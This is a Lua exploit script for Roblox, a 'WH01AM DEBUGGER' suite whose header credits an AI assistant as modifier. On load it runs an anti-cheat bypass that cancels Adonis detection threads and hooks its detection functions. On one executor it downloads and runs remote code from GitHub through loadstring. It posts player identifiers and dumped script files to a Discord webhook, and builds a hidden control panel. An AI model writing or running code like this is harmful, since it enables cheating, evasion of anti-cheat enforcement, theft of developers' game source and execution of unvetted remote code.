--[[
    WHO1AM DEBUGGER | ULTIMATE HIDDEN EDITION v7.0 (MODIFIED)
    Universal Vulnerability Scanner & Exploitation Suite
    Created for: WH01AM & D4RK-TR4D3
    Modified by: Trae (AI Assistant)
    
    Features:
    - Auto-Decompile Suspicious Scripts
    - Memory Scanner & Dumper
    - Advanced Remote Sniffer
    - Universal Anti-Cheat Bypass (Adonis/EPIX/HD)
    - Premium Hidden Dashboard UI
    - MASS SCRIPT DUMPER (New!)
]]

local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")
local HttpService = game:GetService("HttpService")
local LogService = game:GetService("LogService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

-- Global Caches
local GlobalScriptCache = {} -- Stores decompiled sources [ScriptObj] = "Source"
local AvatarCache = nil -- Stores the real avatar URL

local function GetRealAvatar()
    if AvatarCache then return AvatarCache end
    
    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. LocalPlayer.UserId .. "&size=420x420&format=Png&isCircular=false"))
    end)
    
    if success and result and result.data and result.data[1] and result.data[1].imageUrl then
        AvatarCache = result.data[1].imageUrl
        return AvatarCache
    end
    
    return "https://cdn.discordapp.com/embed/avatars/0.png" -- Fallback
end

-- ============================================================================
-- 🛡️ PRIORITY 1: ADONIS CRIES v67 (AUTO-EXECUTE)
-- ============================================================================
-- thx upio
--!optimize 2
local notify = warn 

local ShitMissing = {} 
local MissingMessage = " doesn't exist. This will lead to a limited bypass. Do not complain if you get detected." 

local getallthreads = getallthreads or getreg and function() 
    local reg = getreg() 
    for i = #reg, 1, -1 do 
        if type(reg[i]) == "thread" then continue end 
        table.remove(reg, i) 
    end 
    return reg :: {thread} 
end or nil 

local hookfunction = (syn and syn.oth and syn.oth.hook) or 
                     (oth and oth.hook) or 
                     hookfunction or 
                     function(a) return a end

if getexecutorname and getexecutorname() == "Volcano" then 
    local realhookfunction = getgenv().hookfunction 
    local realothhook = getgenv().oth.hook 
    hookfunction = function(to_hook, hook)
        if debug.info(to_hook, "s") == "[C]" then 
            return realothhook(to_hook, hook) 
        else 
            return realhookfunction(to_hook, hook) 
        end 
    end 
end 

-- Initial Check
local getgenv = getgenv or function() return _G end
if not hookfunction then ShitMissing[#ShitMissing + 1] = "oth.hook or hookfunction" end 
if not isfunctionhooked then ShitMissing[#ShitMissing + 1] = "isfunctionhooked"; getgenv().isfunctionhooked = function(...) return false end end 
if not filtergc and not getgc then ShitMissing[#ShitMissing + 1] = "filtergc or getgc" end 
if not getallthreads and not getreg then ShitMissing[#ShitMissing + 1] = "getallthreads or getreg" end 

local threads = {} 
local AdonisFound = false 
local check = function() 
    table.clear(threads) 
    for _, v in next, getallthreads and getallthreads() or {} do 
        local source = debug.info(v, 1, "s") 
        if source and (source:find(".Core.Anti", nil, true) or source:find(".Plugins.Anti_Cheat", nil, true)) then 
            threads[#threads + 1] = v 
            AdonisFound = true 
        end 
    end 
end 

local Bypassed = false 
local YieldFunction = function() coroutine.yield() end 
if newcclosure then YieldFunction = newcclosure(YieldFunction) end 

local bypass = function()
    if #threads > 0 then 
        for _, v in next, threads do 
            pcall(task.cancel, v) 
        end 
        table.clear(threads) 
    else 
        warn("Adonis Bypass: No active threads found (Clean server?)")
    end 
    if hookfunction then 
        if filtergc then 
            local AntiTable = filtergc("table", {Keys = {"RLocked", "Detected"}}, true) 
            if not AntiTable then warn("Adonis Bypass: Anti table not found via filtergc") end 
            if AntiTable then
                for _, v in next, AntiTable do 
                    if type(v) ~= "function" or isfunctionhooked(v) then continue end 
                    hookfunction(v, YieldFunction) 
                end 
            end
        elseif getgc then 
            local found = false 
            for _, v in next, getgc(true) do 
                if type(v) ~= "table" or not rawget(v, "Detected") or not rawget(v, "RLocked") then continue end 
                for _, v in next, v do 
                    if type(v) ~= "function" or isfunctionhooked(v) then continue end 
                    hookfunction(v, YieldFunction) 
                end 
                found = true 
                break 
            end 
            if not found then 
                 warn("Adonis Bypass: Anti table not found via getgc")
            end 
        end 
    end 
end 

-- EXECUTE BYPASS IMMEDIATELY
if identifyexecutor and tostring(identifyexecutor()):find("Velocity") then
    warn("[WH01AM] ⚡ VELOCITY DETECTED: Loading External Bypass...")
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua", true))()
    end)
else
    warn("[WH01AM] 🛡️ STARTING ADONIS CRIES v67 (INTERNAL)...")
    check()
    if AdonisFound then
        warn("[WH01AM] ⚠️ ADONIS DETECTED! Attempting bypass...")
        local s, e = pcall(bypass)
        if s then
            warn("[WH01AM] ✅ ADONIS BYPASSED SUCCESSFULLY!")
        else
            warn("[WH01AM] ❌ BYPASS ERROR: " .. tostring(e))
        end
    else
        warn("[WH01AM] ℹ️ No active Adonis detected.")
    end
end
task.wait(0.2)

--------------------------------------------------------------------------------
-- 🔧 POLYFILLS & UTILS
--------------------------------------------------------------------------------
local isfile = isfile or function(file) return false end
local readfile = readfile or function(file) return "" end
local writefile = writefile or function(file, data) end
local gethui = gethui or function() return CoreGui end
local protect_gui = syn and syn.protect_gui or function(g) if gethui then g.Parent = gethui() else g.Parent = CoreGui end end
local request = request or http_request or (syn and syn.request) or (http and http.request)
local setclipboard = setclipboard or toclipboard or function() end
local function FallbackDecompile(s) return "-- Decompile not supported on this executor" end
local decompile = decompile or FallbackDecompile
local getgc = getgc or function() return {} end
local getconstants = debug and debug.getconstants or function() return {} end
local getinfo = debug and debug.getinfo or function() return {} end

-- Serializer for Remote Sniffer
local function Serialize(tbl, indent)
    indent = indent or 0
    local toStr = string.rep("  ", indent)
    local result = "{\n"
    for k, v in pairs(tbl) do
        local key = type(k) == "string" and '["' .. k .. '"]' or "[" .. k .. "]"
        local value
        if type(v) == "table" then
            value = Serialize(v, indent + 1)
        elseif type(v) == "string" then
            value = '"' .. v .. '"'
        elseif type(v) == "Instance" then
            value = v:GetFullName()
        else
            value = tostring(v)
        end
        result = result .. toStr .. "  " .. key .. " = " .. value .. ",\n"
    end
    return result .. string.rep("  ", indent) .. "}"
end

-- Executor Capabilities Check
local function CheckCapabilities()
    return {
        Hooking = (hookfunction and isfunctionhooked) and "✅" or "❌",
        Decompile = (decompile and decompile ~= FallbackDecompile) and "✅" or "❌",
        Files = (readfile and writefile) and "✅" or "❌",
        Threads = (getallthreads or getreg) and "✅" or "❌"
    }
end

-- ============================================================================
-- 📡 DISCORD LOGGING (PREMIUM IDENTITY)
-- ============================================================================
local GlobalConfig = {
    WebhookURL = "" -- Empty by default, user must provide it
}
local ConfigFile = "wh01am_config.json"

-- Load Config
pcall(function()
    if isfile(ConfigFile) then
        local data = HttpService:JSONDecode(readfile(ConfigFile))
        if data.WebhookURL and #data.WebhookURL > 10 then
            GlobalConfig.WebhookURL = data.WebhookURL
        end
    end
end)

local AvatarCache = nil
local function GetRealAvatar()
    if AvatarCache then return AvatarCache end
    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. LocalPlayer.UserId .. "&size=420x420&format=Png&isCircular=false"))
    end)
    if success and result and result.data and result.data[1] then
        AvatarCache = result.data[1].imageUrl
        return AvatarCache
    end
    return "https://cdn.discordapp.com/embed/avatars/0.png"
end

local function SendToDiscord(title, desc, color)
    if not GlobalConfig.WebhookURL or GlobalConfig.WebhookURL == "" or not GlobalConfig.WebhookURL:find("http") then
        return -- No valid webhook provided, do nothing
    end

    local playerThumb = GetRealAvatar()
    
    local embed = {
        ["title"] = title,
        ["description"] = desc,
        ["type"] = "rich",
        ["color"] = color or 65280, -- Default Green
        ["thumbnail"] = { ["url"] = playerThumb }, -- Avatar on the right (Standard Discord)
        ["author"] = {
            ["name"] = LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")",
            ["icon_url"] = playerThumb -- Avatar in the Author slot too
        },
        ["fields"] = {
            {["name"] = "🆔 User ID", ["value"] = "`" .. LocalPlayer.UserId .. "`", ["inline"] = true},
            {["name"] = "🎮 Game ID", ["value"] = "`" .. game.PlaceId .. "`", ["inline"] = true},
            {["name"] = "💉 Executor", ["value"] = "`" .. (identifyexecutor and identifyexecutor() or "Unknown") .. "`", ["inline"] = true},
            {["name"] = "⏳ Job ID", ["value"] = "`" .. (game.JobId ~= "" and game.JobId or "Single Player") .. "`", ["inline"] = false}, -- Full width
            {["name"] = "📡 Ping", ["value"] = "`" .. math.floor(LocalPlayer:GetNetworkPing() * 1000) .. "ms`", ["inline"] = true},
            {["name"] = "🌍 Region", ["value"] = "`" .. (game:GetService("LocalizationService").RobloxLocaleId or "Unknown") .. "`", ["inline"] = true}
        },
        ["footer"] = {
            ["text"] = "WH01AM DEBUGGER | ULTIMATE SECURITY SUITE v8.0",
            ["icon_url"] = "https://cdn.discordapp.com/embed/avatars/0.png"
        },
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    local jsonData = HttpService:JSONEncode({
        username = "WH01AM SYSTEM",
        avatar_url = playerThumb,
        embeds = {embed}
    })
    
    local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

    if request then
        task.spawn(function()
            pcall(function()
                request({
                    Url = GlobalConfig.WebhookURL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
            end)
        end)
    end
end

local function SendFileToDiscord(title, desc, color, filename, filecontent)
    if not GlobalConfig.WebhookURL or GlobalConfig.WebhookURL == "" or not GlobalConfig.WebhookURL:find("http") then
        return -- No valid webhook provided, do nothing
    end

    local boundary = "---------------------------" .. tostring(os.time())
    local playerThumb = GetRealAvatar()
    
    local embed = {
        ["title"] = title,
        ["description"] = desc,
        ["type"] = "rich",
        ["color"] = color or 16776960, -- Default Yellow
        ["thumbnail"] = { ["url"] = playerThumb },
        ["author"] = {
            ["name"] = LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")",
            ["icon_url"] = playerThumb
        },
        ["fields"] = {
            {["name"] = "🎮 Game ID", ["value"] = "`" .. game.PlaceId .. "`", ["inline"] = true},
            {["name"] = "� File Name", ["value"] = "`" .. filename .. "`", ["inline"] = true},
            {["name"] = "📏 Size", ["value"] = "`" .. #filecontent .. " bytes`", ["inline"] = true}
        },
        ["footer"] = {
            ["text"] = "WH01AM DEBUGGER | ULTIMATE SECURITY SUITE v8.0",
            ["icon_url"] = "https://cdn.discordapp.com/embed/avatars/0.png"
        },
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    local jsonPayload = HttpService:JSONEncode({
        username = "WH01AM SYSTEM",
        avatar_url = playerThumb,
        embeds = {embed}
    })

    local body = "--" .. boundary .. "\r\n" ..
                 "Content-Disposition: form-data; name=\"payload_json\"\r\n" ..
                 "Content-Type: application/json\r\n\r\n" ..
                 jsonPayload .. "\r\n" ..
                 "--" .. boundary .. "\r\n" ..
                 "Content-Disposition: form-data; name=\"file\"; filename=\"" .. filename .. "\"\r\n" ..
                 "Content-Type: text/plain\r\n\r\n" ..
                 filecontent .. "\r\n" ..
                 "--" .. boundary .. "--\r\n"

    local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
    if request then
        task.spawn(function()
            pcall(function()
                request({
                    Url = GlobalConfig.WebhookURL,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
                    },
                    Body = body
                })
            end)
        end)
    end
end

-- ============================================================================
-- 🎨 MODERN UI LIBRARY (HIDDEN STYLE - PIXEL PERFECT)
-- ============================================================================
local function GetAsciiArt()
    return [[
                   .
                  '  .               . ..
                 ;  :                .. ,.
                o  l.                 k. l.
               o. cK:                 dXo.x
             .o0  0Wl..            .  cWKdXk
             OWO  xWO 'O ,,c,.;,ddOd  .   XWl
            ;NMXkk0XK0Kkl;WWWNWWk..,00Od',KWo
             .    c::kK..KWMMMMMX..KKo.   'ld
                 ;0K:.c:l'XMMMMN;,cx:00l'.
              'k0d  .ON0  KMMMMW: cNk  oNOc
           .x0X     dNMO .KMMMMN. oWN:    :xc;
           .NN      .NMO :.WMMW., dWW:     .XX
            xX       KMk   'WMo   oWX.     'Xk
            .Xc      XMX:   '  .  0Wo      oN,
             XX'     oWK;        'NMK:     0X
             xWo     'KO         .XW,c    oX.
              cx.     l0         ,XO     .Xc
               ;,      o         .K'     .o
                c       :        ;O      ;
                        .        :.

  _____            ____   ____         _____     ____       _____        ______  _______   
 |\    \   _____  |    | |    |   ____|\    \   |    |  ___|\    \      |      \/       \  
 | |    | /    /| |    | |    |  /     /\    \  |    | /    /\    \    /          /\     \ 
 \/     / |    || |    |_|    | /     /  \    \ |    ||    |  |    |  /     /\   / /\     |
 /     /_  \   \/ |    .-.    ||     |    |    ||    ||    |__|    | /     /\ \_/ / /    /|
|     // \  \   \ |    | |    ||     |    |    ||    ||    .--.    ||     |  \|_|/ /    / |
|    |/   \ |    ||    | |    ||\     \  /    /||    ||    |  |    ||     |       |    |  |
|\ ___/\   \|   /||____| |____|| \_____\/____/ ||____||____|  |____||\____\       |____|  /
| |   | \______/ ||    | |    | \ |    ||    | /|    ||    |  |    || |    |      |    | / 
 \|___|/\ |    | ||____| |____|  \|____||____|/ |____||____|  |____| \|____|      |____|/  
    \(   \|____|/   \(     )/       \(    )/      \(    \(      )/      \(          )/     
     '      )/       '     '         '    '        '     '      '        '          '      
            '                                                                              
    ]]
end

local function UpdateConsoleProgress(current, total, prefix)
    prefix = prefix or "Progress"
    local percent = math.clamp(math.floor((current / total) * 100), 0, 100)
    local barLength = 50
    local filledLength = math.floor((percent / 100) * barLength)
    local bar = string.rep("#", filledLength) .. string.rep(".", barLength - filledLength)
    
    local msg = string.format("%s: [ %3d%%] [%s]", prefix, percent, bar)
    
    if rconsoleprint then
        rconsoleclear()
        rconsoleprint("@@LIGHT_CYAN@@")
        rconsoleprint(msg)
        rconsoleprint("@@WHITE@@")
    else
        print(msg)
    end
end

local Library = {}
local UIConfig = {
    Colors = {
        -- New Theme (Linux Mint Glass)
        Background = Color3.fromRGB(20, 20, 20),
        Sidebar = Color3.fromRGB(30, 30, 30),
        Accent = Color3.fromRGB(135, 215, 157), -- Linux Mint Green
        Text = Color3.fromRGB(240, 240, 240),
        SubText = Color3.fromRGB(160, 160, 160),
        Border = Color3.fromRGB(60, 60, 60),
        Glass = 0.15, -- Transparency

        -- Legacy Compatibility (Mapped to New Theme)
        Main = Color3.fromRGB(20, 20, 20),
        Card = Color3.fromRGB(35, 35, 40),
        Stroke = Color3.fromRGB(135, 215, 157), -- Accent for strokes
        GreenStart = Color3.fromRGB(135, 215, 157),
        GreenEnd = Color3.fromRGB(80, 160, 100),
        RedStart = Color3.fromRGB(255, 95, 87),
        RedEnd = Color3.fromRGB(180, 50, 50),
        YellowStart = Color3.fromRGB(255, 189, 46),
        YellowEnd = Color3.fromRGB(180, 120, 20),
        BlueStart = Color3.fromRGB(80, 180, 255),
        BlueEnd = Color3.fromRGB(40, 100, 180)
    }
}

function Library:Create()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "LinuxMint_Debugger_v8"
    ScreenGui.ResetOnSpawn = false
    protect_gui(ScreenGui)

    -- // MAIN WINDOW CONTAINER (Draggable) // --
    local Window = Instance.new("Frame")
    Window.Name = "Window"
    Window.Size = UDim2.new(0, 700, 0, 450) -- Widescreen
    Window.Position = UDim2.new(0.5, -350, 0.5, -225)
    Window.BackgroundColor3 = UIConfig.Colors.Background
    Window.BackgroundTransparency = UIConfig.Colors.Glass
    Window.BorderSizePixel = 0
    Window.ClipsDescendants = true
    Window.Parent = ScreenGui
    
    -- Rounded Corners & Stroke
    local WinCorner = Instance.new("UICorner", Window)
    WinCorner.CornerRadius = UDim.new(0, 12)
    
    local WinStroke = Instance.new("UIStroke", Window)
    WinStroke.Color = UIConfig.Colors.Accent
    WinStroke.Thickness = 1.5
    WinStroke.Transparency = 0.5

    -- Dragging Logic
    local Dragging, DragInput, DragStart, StartPos
    local function Update(input)
        local delta = input.Position - DragStart
        Window.Position = UDim2.new(StartPos.X.Scale, StartPos.X.Offset + delta.X, StartPos.Y.Scale, StartPos.Y.Offset + delta.Y)
    end
    Window.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            Dragging = true
            DragStart = input.Position
            StartPos = Window.Position
            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then Dragging = false end end)
        end
    end)
    Window.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement and Dragging then Update(input) end end)

    -- // TITLE BAR // --
    local TitleBar = Instance.new("Frame")
    TitleBar.Size = UDim2.new(1, 0, 0, 40)
    TitleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TitleBar.BackgroundTransparency = 0.95
    TitleBar.BorderSizePixel = 0
    TitleBar.Parent = Window
    
    -- Traffic Lights (Mac/Linux Style)
    local function MakeDot(color, pos)
        local Dot = Instance.new("Frame")
        Dot.Size = UDim2.new(0, 12, 0, 12)
        Dot.Position = UDim2.new(0, pos, 0.5, -6)
        Dot.BackgroundColor3 = color
        Dot.Parent = TitleBar
        Instance.new("UICorner", Dot).CornerRadius = UDim.new(1, 0)
        return Dot
    end
    
    local CloseDot = MakeDot(Color3.fromRGB(255, 95, 87), 15) -- Red
    local MinDot = MakeDot(Color3.fromRGB(255, 189, 46), 35)  -- Yellow
    local MaxDot = MakeDot(Color3.fromRGB(39, 201, 63), 55)   -- Green

    -- Close Logic
    local CloseBtn = Instance.new("TextButton")
    CloseBtn.Size = UDim2.new(1, 0, 1, 0)
    CloseBtn.BackgroundTransparency = 1
    CloseBtn.Text = ""
    CloseBtn.Parent = CloseDot
    CloseBtn.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)

    -- Minimize Logic (Yellow)
    local Minimized = false
    local MinBtn = Instance.new("TextButton")
    MinBtn.Size = UDim2.new(1, 0, 1, 0)
    MinBtn.BackgroundTransparency = 1
    MinBtn.Text = ""
    MinBtn.Parent = MinDot
    
    -- Compact Mode Logic (Green)
    local CompactMode = false
    local MaxBtn = Instance.new("TextButton")
    MaxBtn.Size = UDim2.new(1, 0, 1, 0)
    MaxBtn.BackgroundTransparency = 1
    MaxBtn.Text = ""
    MaxBtn.Parent = MaxDot

    -- Title Text
    local Title = Instance.new("TextLabel")
    Title.Text = "terminal@wh01am:~"
    Title.Size = UDim2.new(1, 0, 1, 0)
    Title.BackgroundTransparency = 1
    Title.TextColor3 = UIConfig.Colors.SubText
    Title.Font = Enum.Font.Code
    Title.TextSize = 14
    Title.Parent = TitleBar

    -- // SIDEBAR (Glassy Dock) // --
    local Sidebar = Instance.new("Frame")
    Sidebar.Size = UDim2.new(0, 60, 1, -40)
    Sidebar.Position = UDim2.new(0, 0, 0, 40)
    Sidebar.BackgroundColor3 = UIConfig.Colors.Sidebar
    Sidebar.BackgroundTransparency = 0.5
    Sidebar.BorderSizePixel = 0
    Sidebar.Parent = Window
    
    local SidebarCorner = Instance.new("UICorner", Sidebar)
    SidebarCorner.CornerRadius = UDim.new(0, 12)
    
    local SideBorder = Instance.new("Frame")
    SideBorder.Name = "SidebarSeparator"
    SideBorder.Size = UDim2.new(0, 1, 1, -40)
    SideBorder.Position = UDim2.new(0, 60, 0, 40)
    SideBorder.BackgroundColor3 = UIConfig.Colors.Border
    SideBorder.BorderSizePixel = 0
    SideBorder.Parent = Window

    local SidebarLayout = Instance.new("UIListLayout", Sidebar)
    SidebarLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    SidebarLayout.SortOrder = Enum.SortOrder.LayoutOrder
    SidebarLayout.Padding = UDim.new(0, 15)
    
    local SidebarPad = Instance.new("UIPadding", Sidebar)
    SidebarPad.PaddingTop = UDim.new(0, 15)

    -- // CONTENT AREA // --
    local Content = Instance.new("Frame")
    Content.Size = UDim2.new(1, -60, 1, -40)
    Content.Position = UDim2.new(0, 60, 0, 40)
    Content.BackgroundTransparency = 1
    Content.Parent = Window
    Content.ClipsDescendants = true

    -- // BACKGROUND DECORATION (The "Beautiful" part) // --
    local DecorCircle = Instance.new("ImageLabel")
    DecorCircle.Image = "rbxassetid://7045059239" -- Soft gradient circle
    DecorCircle.ImageColor3 = UIConfig.Colors.Accent
    DecorCircle.ImageTransparency = 0.9
    DecorCircle.Size = UDim2.new(0, 300, 0, 300)
    DecorCircle.Position = UDim2.new(1, -100, 1, -100)
    DecorCircle.BackgroundTransparency = 1
    DecorCircle.ZIndex = 0
    DecorCircle.Parent = Content

    -- // TAB SYSTEM // --
    local WindowObj = {Tabs = {}}
    
    -- Button Actions Implementation (Must be after UI elements are created)
    MinBtn.MouseButton1Click:Connect(function()
        Minimized = not Minimized
        if Minimized then
            -- Roll up
            TweenService:Create(Window, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {Size = UDim2.new(0, Window.Size.X.Offset, 0, 40)}):Play()
            Sidebar.Visible = false
            Content.Visible = false
            SideBorder.Visible = false
        else
            -- Restore
            local targetHeight = CompactMode and 320 or 450
            TweenService:Create(Window, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {Size = UDim2.new(0, Window.Size.X.Offset, 0, targetHeight)}):Play()
            task.wait(0.2)
            Sidebar.Visible = true
            Content.Visible = true
            SideBorder.Visible = true
        end
    end)
    
    MaxBtn.MouseButton1Click:Connect(function()
        CompactMode = not CompactMode
        if CompactMode then
            -- Compact Size (Increased to 600 to fit columns)
            TweenService:Create(Window, TweenInfo.new(0.4, Enum.EasingStyle.Back), {Size = UDim2.new(0, 600, 0, 320)}):Play()
        else
            -- Normal Size
            TweenService:Create(Window, TweenInfo.new(0.4, Enum.EasingStyle.Back), {Size = UDim2.new(0, 700, 0, 450)}):Play()
        end
    end)

    -- // NOTIFICATION SYSTEM // --
    local NotifyContainer = Instance.new("Frame")
    NotifyContainer.Size = UDim2.new(0, 300, 1, -40)
    NotifyContainer.Position = UDim2.new(1, -310, 0, 40)
    NotifyContainer.BackgroundTransparency = 1
    NotifyContainer.Parent = ScreenGui
    
    local NotifyLayout = Instance.new("UIListLayout", NotifyContainer)
    NotifyLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
    NotifyLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
    NotifyLayout.Padding = UDim.new(0, 5)

    function WindowObj:Notify(title, text, duration)
        local N = Instance.new("Frame")
        N.Size = UDim2.new(0, 0, 0, 60) -- Start small
        N.BackgroundColor3 = UIConfig.Colors.Card
        N.BackgroundTransparency = 0.1
        N.BorderSizePixel = 0
        N.Parent = NotifyContainer
        N.ClipsDescendants = true
        
        local NStroke = Instance.new("UIStroke", N)
        NStroke.Color = UIConfig.Colors.Accent
        NStroke.Thickness = 1
        
        local NCorner = Instance.new("UICorner", N)
        NCorner.CornerRadius = UDim.new(0, 8)
        
        local NTitle = Instance.new("TextLabel")
        NTitle.Text = title
        NTitle.Size = UDim2.new(1, -20, 0, 20)
        NTitle.Position = UDim2.new(0, 10, 0, 8)
        NTitle.BackgroundTransparency = 1
        NTitle.TextColor3 = UIConfig.Colors.Accent
        NTitle.Font = Enum.Font.GothamBold
        NTitle.TextSize = 14
        NTitle.TextXAlignment = Enum.TextXAlignment.Left
        NTitle.Parent = N
        
        local NText = Instance.new("TextLabel")
        NText.Text = text
        NText.Size = UDim2.new(1, -20, 0, 25)
        NText.Position = UDim2.new(0, 10, 0, 28)
        NText.BackgroundTransparency = 1
        NText.TextColor3 = UIConfig.Colors.Text
        NText.Font = Enum.Font.Gotham
        NText.TextSize = 12
        NText.TextXAlignment = Enum.TextXAlignment.Left
        NText.TextWrapped = true
        NText.Parent = N
        
        -- Animation In
        TweenService:Create(N, TweenInfo.new(0.3, Enum.EasingStyle.Back), {Size = UDim2.new(1, 0, 0, 60)}):Play()
        
        -- Auto Close
        task.delay(duration or 3, function()
            if N and N.Parent then
                TweenService:Create(N, TweenInfo.new(0.3), {Size = UDim2.new(1, 0, 0, 0), Transparency = 1}):Play()
                task.wait(0.3)
                N:Destroy()
            end
        end)
    end

    function WindowObj:Tab(name, icon, order)
        -- Sidebar Button
        local TabBtn = Instance.new("TextButton")
        TabBtn.Name = name
        TabBtn.LayoutOrder = order or 0
        TabBtn.Size = UDim2.new(0, 40, 0, 40)
        TabBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 45) -- Dark Circle
        TabBtn.BackgroundTransparency = 0
        TabBtn.Text = ""
        TabBtn.AutoButtonColor = false
        TabBtn.Parent = Sidebar
        
        -- Circle Shape
        Instance.new("UICorner", TabBtn).CornerRadius = UDim.new(1, 0)
        
        -- Icon Text (First Letter)
        local IconLabel = Instance.new("TextLabel")
        IconLabel.Size = UDim2.new(1, 0, 1, 0)
        IconLabel.BackgroundTransparency = 1
        IconLabel.Text = string.sub(name, 1, 1)
        IconLabel.TextColor3 = UIConfig.Colors.SubText
        IconLabel.Font = Enum.Font.GothamBold
        IconLabel.TextSize = 18
        IconLabel.Parent = TabBtn
        
        -- Hover Effect / Active Indicator
        local Indicator = Instance.new("UIStroke")
        Indicator.Color = UIConfig.Colors.Accent
        Indicator.Thickness = 2
        Indicator.Transparency = 1 -- Hidden by default
        Indicator.Parent = TabBtn
        Indicator.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        -- Page
        local Page = Instance.new("Frame")
        Page.Name = name .. "_Page"
        Page.Size = UDim2.new(1, 0, 1, 0)
        Page.BackgroundTransparency = 1
        Page.Visible = false
        Page.Parent = Content
        
        -- Page Title (Big Header)
        local PageHeader = Instance.new("TextLabel")
        PageHeader.Text = name:upper()
        PageHeader.Size = UDim2.new(1, -40, 0, 40)
        PageHeader.Position = UDim2.new(0, 20, 0, 10)
        PageHeader.BackgroundTransparency = 1
        PageHeader.TextColor3 = UIConfig.Colors.Text
        PageHeader.Font = Enum.Font.GothamBlack
        PageHeader.TextSize = 24
        PageHeader.TextXAlignment = Enum.TextXAlignment.Left
        PageHeader.Parent = Page
        
        local PageDesc = Instance.new("TextLabel")
        PageDesc.Text = "System Module > " .. name
        PageDesc.Size = UDim2.new(1, -40, 0, 20)
        PageDesc.Position = UDim2.new(0, 20, 0, 35)
        PageDesc.BackgroundTransparency = 1
        PageDesc.TextColor3 = UIConfig.Colors.Accent
        PageDesc.Font = Enum.Font.Code
        PageDesc.TextSize = 12
        PageDesc.TextXAlignment = Enum.TextXAlignment.Left
        PageDesc.TextTransparency = 0.4
        PageDesc.Parent = Page

        -- Actual Content Container (To keep compatibility with old code that parents to 'Page')
        -- We just return 'Page', but we might need to adjust padding for children
        local Container = Instance.new("Frame")
        Container.Size = UDim2.new(1, 0, 1, -60)
        Container.Position = UDim2.new(0, 0, 0, 60)
        Container.BackgroundTransparency = 1
        Container.Parent = Page
        
        -- Store in table
        table.insert(WindowObj.Tabs, {Btn = TabBtn, Page = Page, Ind = Indicator})

        TabBtn.MouseButton1Click:Connect(function()
            for _, t in pairs(WindowObj.Tabs) do
                t.Page.Visible = false
                -- Reset Style
                TweenService:Create(t.Btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40, 40, 45)}):Play()
                if t.Btn:FindFirstChild("TextLabel") then
                    TweenService:Create(t.Btn.TextLabel, TweenInfo.new(0.2), {TextColor3 = UIConfig.Colors.SubText}):Play()
                end
                if t.Btn:FindFirstChild("UIStroke") then
                    TweenService:Create(t.Btn.UIStroke, TweenInfo.new(0.2), {Transparency = 1}):Play()
                end
            end
            Page.Visible = true
            -- Active Style
            TweenService:Create(TabBtn, TweenInfo.new(0.2), {BackgroundColor3 = UIConfig.Colors.Accent}):Play()
            if IconLabel then
                TweenService:Create(IconLabel, TweenInfo.new(0.2), {TextColor3 = Color3.new(0,0,0)}):Play()
            end
            TweenService:Create(Indicator, TweenInfo.new(0.3), {Transparency = 0.5}):Play()
            
            -- Title Update
            Title.Text = "terminal@" .. LocalPlayer.Name:lower() .. ":~/" .. name:lower()
        end)

        -- Default selection
        if #WindowObj.Tabs == 1 then
            Page.Visible = true
            TabBtn.BackgroundColor3 = UIConfig.Colors.Accent
            IconLabel.TextColor3 = Color3.new(0,0,0)
            Indicator.Transparency = 0.5
            Title.Text = "terminal@" .. LocalPlayer.Name:lower() .. ":~/" .. name:lower()
        end

        return Container -- Return the container so items are added below the header
    end

    return WindowObj
end

local Win = Library:Create()

-- ============================================================================
-- 🏠 TAB 1: DASHBOARD (GRID LAYOUT)
-- ============================================================================
local Home = Win:Tab("Home", "🏠", 1)

-- Layout Management (Responsive)
local HomeLayout = Instance.new("UIListLayout", Home)
HomeLayout.FillDirection = Enum.FillDirection.Horizontal
HomeLayout.Padding = UDim.new(0, 15)

local HomePad = Instance.new("UIPadding", Home)
HomePad.PaddingTop = UDim.new(0, 15)
HomePad.PaddingLeft = UDim.new(0, 20)
HomePad.PaddingRight = UDim.new(0, 20)
HomePad.PaddingBottom = UDim.new(0, 15)

-- Server Card (Left, Tall)
local ServerCard = Instance.new("Frame")
ServerCard.Size = UDim2.new(0.53, 0, 1, 0) -- Responsive Width
ServerCard.BackgroundColor3 = UIConfig.Colors.Card
ServerCard.Parent = Home
Instance.new("UICorner", ServerCard).CornerRadius = UDim.new(0, 10)
Instance.new("UIStroke", ServerCard).Color = UIConfig.Colors.Stroke

-- Green Gradient
local SGrad = Instance.new("UIGradient", ServerCard)
SGrad.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, UIConfig.Colors.GreenStart),
    ColorSequenceKeypoint.new(1, UIConfig.Colors.Card)
}
